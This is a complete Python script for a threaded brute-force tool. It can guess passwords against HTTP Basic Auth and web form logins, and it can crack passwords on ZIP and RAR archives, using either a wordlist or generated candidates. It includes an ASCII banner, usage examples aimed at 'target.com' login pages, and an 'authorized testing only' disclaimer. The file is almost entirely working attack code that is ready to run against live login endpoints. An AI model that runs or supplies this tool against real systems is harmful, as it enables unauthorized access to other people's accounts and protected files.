#!/usr/bin/env python3
"""
Simple Brute-Force Script for Authorized Penetration Testing
Supports: HTTP Basic Auth, Form-based Login, ZIP/RAR Password Cracking
DISCLAIMER: Only use on systems you own or have explicit written permission to test.
"""

import argparse
import sys
import itertools
import string
import zipfile
import rarfile
import requests
import concurrent.futures
import time
from urllib.parse import urljoin
from pathlib import Path


class BruteForcer:
    def __init__(self, target, wordlist=None, threads=10, verbose=False):
        self.target = target
        self.wordlist = wordlist
        self.threads = threads
        self.verbose = verbose
        self.found = False
        self.result = None
        self.attempts = 0

    def _log(self, msg):
        if self.verbose:
            print(f"[INFO] {msg}")

    def _generate_wordlist(self, min_len=1, max_len=4, charset=None):
        """Generate wordlist on-the-fly if no file provided."""
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        self._log(f"Generating wordlist: length {min_len}-{max_len}, charset: {charset}")
        for length in range(min_len, max_len + 1):
            for candidate in itertools.product(charset, repeat=length):
                yield ''.join(candidate)

    def _load_wordlist(self):
        """Load wordlist from file or generate dynamically."""
        if self.wordlist and Path(self.wordlist).exists():
            self._log(f"Loading wordlist from: {self.wordlist}")
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    yield line.strip()
        else:
            self._log("No wordlist file found, using generated wordlist")
            yield from self._generate_wordlist()

    # ─── HTTP BASIC AUTH ───
    def brute_http_basic(self, username):
        """Brute-force HTTP Basic Authentication."""
        print(f"[+] Target: {self.target}")
        print(f"[+] Mode: HTTP Basic Auth")
        print(f"[+] Username: {username}")
        print(f"[+] Threads: {self.threads}")
        print("[*] Starting attack...\n")

        def try_password(password):
            if self.found:
                return False
            try:
                resp = requests.get(
                    self.target,
                    auth=(username, password),
                    timeout=10,
                    allow_redirects=False
                )
                self.attempts += 1
                if resp.status_code == 200:
                    self.found = True
                    self.result = password
                    return True
            except requests.RequestException:
                pass
            return False

        passwords = list(self._load_wordlist())
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            for password, success in zip(passwords, executor.map(try_password, passwords)):
                if self.found:
                    break
                if self.verbose and self.attempts % 100 == 0:
                    print(f"    Attempts: {self.attempts} | Current: {password}")

        if self.result:
            print(f"\n[✓] PASSWORD FOUND: {self.result}")
            print(f"[✓] Total attempts: {self.attempts}")
        else:
            print(f"\n[✗] Password not found.")
            print(f"[✗] Total attempts: {self.attempts}")

        return self.result

    # ─── FORM-BASED LOGIN ───
    def brute_form_login(self, username, username_field="username",
                         password_field="password", success_indicator=None,
                         failure_indicator=None, method="POST", extra_data=None):
        """
        Brute-force form-based login.
        success_indicator: text in response that indicates success
        failure_indicator: text in response that indicates failure
        """
        print(f"[+] Target: {self.target}")
        print(f"[+] Mode: Form Login")
        print(f"[+] Username: {username}")
        print(f"[+] Threads: {self.threads}")
        print("[*] Starting attack...\n")

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        def try_password(password):
            if self.found:
                return False
            try:
                data = {username_field: username, password_field: password}
                if extra_data:
                    data.update(extra_data)

                if method.upper() == "GET":
                    resp = requests.get(self.target, params=data, headers=headers, timeout=15)
                else:
                    resp = requests.post(self.target, data=data, headers=headers, timeout=15)

                self.attempts += 1
                text = resp.text

                # Determine success
                is_success = False
                if success_indicator and success_indicator in text:
                    is_success = True
                elif failure_indicator and failure_indicator not in text:
                    is_success = True
                elif resp.status_code == 302 or "dashboard" in text.lower() or "welcome" in text.lower():
                    is_success = True

                if is_success and resp.status_code not in [401, 403]:
                    self.found = True
                    self.result = password
                    return True

            except requests.RequestException as e:
                if self.verbose:
                    print(f"    Error with {password}: {e}")
            return False

        passwords = list(self._load_wordlist())
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            for password, success in zip(passwords, executor.map(try_password, passwords)):
                if self.found:
                    break
                if self.verbose and self.attempts % 100 == 0:
                    print(f"    Attempts: {self.attempts} | Current: {password}")

        if self.result:
            print(f"\n[✓] PASSWORD FOUND: {self.result}")
            print(f"[✓] Total attempts: {self.attempts}")
        else:
            print(f"\n[✗] Password not found.")
            print(f"[✗] Total attempts: {self.attempts}")

        return self.result

    # ─── ZIP PASSWORD CRACKING ───
    def brute_zip(self):
        """Brute-force ZIP file password."""
        print(f"[+] Target: {self.target}")
        print(f"[+] Mode: ZIP Password Crack")
        print(f"[+] Threads: {self.threads}")
        print("[*] Starting attack...\n")

        def try_password(password):
            if self.found:
                return False
            try:
                with zipfile.ZipFile(self.target) as zf:
                    zf.setpassword(password.encode('utf-8'))
                    zf.testzip()
                    self.found = True
                    self.result = password
                    return True
            except (RuntimeError, zipfile.BadZipFile):
                self.attempts += 1
            except Exception:
                pass
            return False

        passwords = list(self._load_wordlist())
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            for password, success in zip(passwords, executor.map(try_password, passwords)):
                if self.found:
                    break
                if self.verbose and self.attempts % 100 == 0:
                    print(f"    Attempts: {self.attempts} | Current: {password}")

        if self.result:
            print(f"\n[✓] PASSWORD FOUND: {self.result}")
        else:
            print(f"\n[✗] Password not found.")
        print(f"[✓] Total attempts: {self.attempts}")
        return self.result

    # ─── RAR PASSWORD CRACKING ───
    def brute_rar(self):
        """Brute-force RAR file password."""
        print(f"[+] Target: {self.target}")
        print(f"[+] Mode: RAR Password Crack")
        print(f"[+] Threads: {self.threads}")
        print("[*] Starting attack...\n")

        def try_password(password):
            if self.found:
                return False
            try:
                with rarfile.RarFile(self.target) as rf:
                    rf.setpassword(password)
                    rf.testrar()
                    self.found = True
                    self.result = password
                    return True
            except (rarfile.BadRarFile, rarfile.PasswordRequired, RuntimeError):
                self.attempts += 1
            except Exception:
                pass
            return False

        passwords = list(self._load_wordlist())
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            for password, success in zip(passwords, executor.map(try_password, passwords)):
                if self.found:
                    break
                if self.verbose and self.attempts % 100 == 0:
                    print(f"    Attempts: {self.attempts} | Current: {password}")

        if self.result:
            print(f"\n[✓] PASSWORD FOUND: {self.result}")
        else:
            print(f"\n[✗] Password not found.")
        print(f"[✓] Total attempts: {self.attempts}")
        return self.result


def print_banner():
    banner = r"""
    ____             __       ____             __  ____         __      
   / __ )_______  __/ /____  / __ )_______  __/ /_/ __/__  ____/ /______
  / __  / ___/ / / / __/ _ \/ __  / ___/ / / / __/ /_/ _ \/ __  / ___/
 / /_/ / /  / /_/ / /_/  __/ /_/ / /  / /_/ / /_/ __/  __/ /_/ (__  ) 
/_____/_/   \__,_/\__/\___/_____/_/   \__,_/\__/_/  \___/\__,_/____/  
                                                                      
    Simple Multi-Mode Brute-Force Tool | Authorized Testing Only
    """
    print(banner)


def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Simple Brute-Force Tool for Authorized Penetration Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP Basic Auth
  python bruteforce.py --mode http-basic -u admin -t http://target.com/login -w passwords.txt

  # Form Login
  python bruteforce.py --mode form -u admin -t http://target.com/login -w passwords.txt --success "Welcome"

  # ZIP Crack
  python bruteforce.py --mode zip -t secret.zip -w passwords.txt

  # Generate wordlist on-the-fly (no -w flag)
  python bruteforce.py --mode http-basic -u admin -t http://target.com/login --min-len 1 --max-len 4
        """
    )

    parser.add_argument("--mode", "-m", required=True,
                        choices=["http-basic", "form", "zip", "rar"],
                        help="Attack mode")
    parser.add_argument("--target", "-t", required=True,
                        help="Target URL or file path")
    parser.add_argument("--username", "-u",
                        help="Username for authentication")
    parser.add_argument("--wordlist", "-w",
                        help="Path to wordlist file (optional, generates if omitted)")
    parser.add_argument("--threads", "-T", type=int, default=10,
                        help="Number of threads (default: 10)")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Enable verbose output")
    parser.add_argument("--min-len", type=int, default=1,
                        help="Min password length for generated wordlist")
    parser.add_argument("--max-len", type=int, default=4,
                        help="Max password length for generated wordlist")

    # Form-specific args
    parser.add_argument("--user-field", default="username",
                        help="Username field name (form mode)")
    parser.add_argument("--pass-field", default="password",
                        help="Password field name (form mode)")
    parser.add_argument("--success", "-s",
                        help="Success indicator text in response")
    parser.add_argument("--failure", "-f",
                        help="Failure indicator text in response")
    parser.add_argument("--method", choices=["GET", "POST"], default="POST",
                        help="HTTP method for form submission")

    args = parser.parse_args()

    bf = BruteForcer(
        target=args.target,
        wordlist=args.wordlist,
        threads=args.threads,
        verbose=args.verbose
    )

    start_time = time.time()

    if args.mode == "http-basic":
        if not args.username:
            print("[!] Username required for HTTP Basic Auth. Use -u")
            sys.exit(1)
        bf.brute_http_basic(args.username)

    elif args.mode == "form":
        if not args.username:
            print("[!] Username required for form login. Use -u")
            sys.exit(1)
        bf.brute_form_login(
            username=args.username,
            username_field=args.user_field,
            password_field=args.pass_field,
            success_indicator=args.success,
            failure_indicator=args.failure,
            method=args.method
        )

    elif args.mode == "zip":
        bf.brute_zip()

    elif args.mode == "rar":
        bf.brute_rar()

    elapsed = time.time() - start_time
    print(f"\n[*] Time elapsed: {elapsed:.2f} seconds")


if __name__ == "__main__":
    main()
